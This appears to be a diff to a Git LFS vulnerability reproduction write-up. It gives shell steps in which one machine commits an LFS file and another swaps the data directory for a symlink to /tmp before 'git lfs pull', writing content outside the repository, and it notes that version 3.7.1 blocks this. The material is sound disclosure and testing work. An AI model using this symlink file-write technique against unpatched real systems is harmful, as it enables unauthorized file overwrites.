@@ -30,9 +30,10 @@ git init
 git lfs install
 git lfs track "*.bin"
 mkdir data
-printf "REAL CONTENT\n" > data/file.bin
+printf "you got pwned\n" > data/file.bin
 git add .gitattributes data/file.bin
 git commit -m "Add LFS file"
+git push
 
 
 # Machine B
@@ -41,6 +42,7 @@ cd lfs-attack-demo
 
 # At this point git has created "data" (a directory) and a pointer file or placeholder.
 # Now remove the directory and replace it with a symlink to /tmp (or another safe path)
+# yeah... the victim will need to create the symblink and pwn themselves...
 rm -rf data
 ln -s /tmp data
 
@@ -49,3 +51,11 @@ git lfs pull
 
 ```
 
+Upgraded `git lts` version 3.7.1: Nothing written to the `SHOULD_BE_EMPTY` directory
+
+<img width="851" height="789" alt="image" src="https://github.com/user-attachments/assets/41fd309a-1610-44f5-97dd-fe7e8ec5e229" />
+
+
+Upgraded `git lts` version 3.7.1: Nothing written to the `SHOULD_BE_EMPTY` directory
+
+<img width="851" height="789" alt="image" src="https://github.com/user-attachments/assets/41fd309a-1610-44f5-97dd-fe7e8ec5e229" />
